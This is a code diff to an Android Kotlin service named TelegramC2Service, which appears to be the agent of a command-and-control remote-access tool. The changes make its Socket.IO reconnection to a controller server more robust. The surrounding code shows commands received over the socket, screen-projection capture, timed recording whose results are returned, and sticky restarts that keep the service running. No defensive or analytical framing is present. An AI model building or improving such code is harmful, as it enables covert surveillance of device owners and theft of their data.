@@ -84,6 +84,7 @@ class TelegramC2Service : Service() {
                 initProjectionFromIntent(code, data)
             }
         }
+        // ensure reconnect loop alive
         if (reconnectJob?.isActive != true) connectSocket()
         return START_STICKY
     }
@@ -153,26 +154,43 @@ class TelegramC2Service : Service() {
 
     // ---------- Socket.IO ----------
 
+    private fun cleanupSocket() {
+        val old = socket
+        socket = null
+        connected = false
+        try { old?.off() } catch (_: Exception) {}
+        try { old?.disconnect() } catch (_: Exception) {}
+        try { old?.close() } catch (_: Exception) {}
+    }
+
     private fun connectSocket() {
         reconnectJob?.cancel()
         reconnectJob = scope.launch {
             while (isActive) {
-                if (!connected && socket == null) {
-                    if (connecting.compareAndSet(false, true)) {
-                        try { doConnect() } finally { connecting.set(false) }
+                if (connected) {
+                    delay(1000)
+                    continue
+                }
+
+                if (connecting.compareAndSet(false, true)) {
+                    try {
+                        cleanupSocket()
+                        doConnect()
+                    } catch (e: Exception) {
+                        log("connect error: ${e.message}")
+                    } finally {
+                        connecting.set(false)
                     }
                 }
 
-                var waited = 0
-                while (isActive && !connected && waited < 30000) {
+                // wait up to 25s for connection
+                var waited = 0L
+                while (isActive && !connected && waited < 25000) {
                     delay(500)
                     waited += 500
                 }
 
-                while (isActive && connected) {
-                    delay(2000)
-                }
-
+                // if not connected, wait before retry
                 if (isActive && !connected) {
                     delay(3000)
                 }
@@ -182,12 +200,6 @@ class TelegramC2Service : Service() {
 
     private fun doConnect() {
         try {
-            try { socket?.off() } catch (_: Exception) {}
-            try { socket?.disconnect() } catch (_: Exception) {}
-            try { socket?.close() } catch (_: Exception) {}
-            socket = null
-            connected = false
-
             val base = serverUrl.trimEnd('/')
             val uri = URI("$base/agent")
 
@@ -220,11 +232,24 @@ class TelegramC2Service : Service() {
                 val reason = args.firstOrNull()?.toString() ?: "?"
                 log("socket disconnected: $reason")
                 connected = false
+                // schedule cleanup so next loop iteration can retry
+                scope.launch {
+                    delay(300)
+                    if (socket === s) {
+                        cleanupSocket()
+                    }
+                }
             }
             s.on(Socket.EVENT_CONNECT_ERROR) { args ->
                 val msg = args.firstOrNull()?.toString() ?: "?"
                 log("socket error: $msg")
                 connected = false
+                scope.launch {
+                    delay(300)
+                    if (socket === s) {
+                        cleanupSocket()
+                    }
+                }
             }
             s.on("accept") { args ->
                 val obj = args.firstOrNull() as? JSONObject ?: return@on
@@ -298,7 +323,6 @@ class TelegramC2Service : Service() {
                         if (startRes.has("error")) {
                             startRes
                         } else {
-                            // Wait for the auto-stop timer inside the session
                             delay((dur + 2) * 1000L)
                             val stopRes = s.stopRecording()
                             if (stopRes.has("error")) stopRes
@@ -451,11 +475,7 @@ class TelegramC2Service : Service() {
     override fun onDestroy() {
         log("onDestroy")
         reconnectJob?.cancel()
-        try { socket?.off() } catch (_: Exception) {}
-        try { socket?.disconnect() } catch (_: Exception) {}
-        try { socket?.close() } catch (_: Exception) {}
-        socket = null
-        connected = false
+        cleanupSocket()
         captureSession?.release()
         captureSession = null
         try { projection?.stop() } catch (_: Exception) {}
